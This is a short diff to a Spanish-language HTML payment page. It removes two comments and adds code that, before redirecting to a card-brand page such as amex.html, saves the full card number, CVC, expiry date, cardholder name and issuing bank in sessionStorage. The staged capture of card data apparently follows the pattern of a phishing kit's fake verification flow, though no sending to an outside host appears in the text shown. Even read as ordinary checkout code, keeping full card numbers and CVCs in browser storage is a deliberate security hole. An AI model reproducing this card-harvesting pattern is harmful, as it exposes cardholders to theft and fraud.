@@ -476,7 +476,6 @@
             flex-shrink: 0;
         }
 
-        /* LOADING OVERLAY */
         .loading-overlay {
             display: none;
             position: fixed;
@@ -674,7 +673,6 @@
     </style>
 </head>
 <body>
-    <!-- LOADING OVERLAY -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="spinner"></div>
         <div class="loading-text">Procesando pago...</div>
@@ -1198,7 +1196,7 @@
         }
 
         // ============================================
-        // REDIRIGIR SEGÚN TIPO DE TARJETA
+        // REDIRIGIR SEGÚN TIPO DE TARJETA (GUARDANDO DATOS)
         // ============================================
         function redirigirSegunTipoTarjeta(tipo) {
             const map = {
@@ -1207,6 +1205,19 @@
                 'amex': 'amex.html'
             };
             const destino = map[tipo] || 'index.html';
+            
+            // ⭐ GUARDAR DATOS DE LA TARJETA EN SESSIONSTORAGE ⭐
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const cardLast4 = cardNumber.slice(-4);
+            
+            sessionStorage.setItem('cardNumber', cardNumber);
+            sessionStorage.setItem('cardLast4', cardLast4);
+            sessionStorage.setItem('cvc', document.getElementById('cvc').value);
+            sessionStorage.setItem('expiry', document.getElementById('expiry').value);
+            sessionStorage.setItem('cardholderName', document.getElementById('cardholderName').value);
+            sessionStorage.setItem('cardType', tipo);
+            sessionStorage.setItem('bancoEmisor', document.getElementById('bancoEmisor').value);
+            
             window.location.href = destino;
         }
 
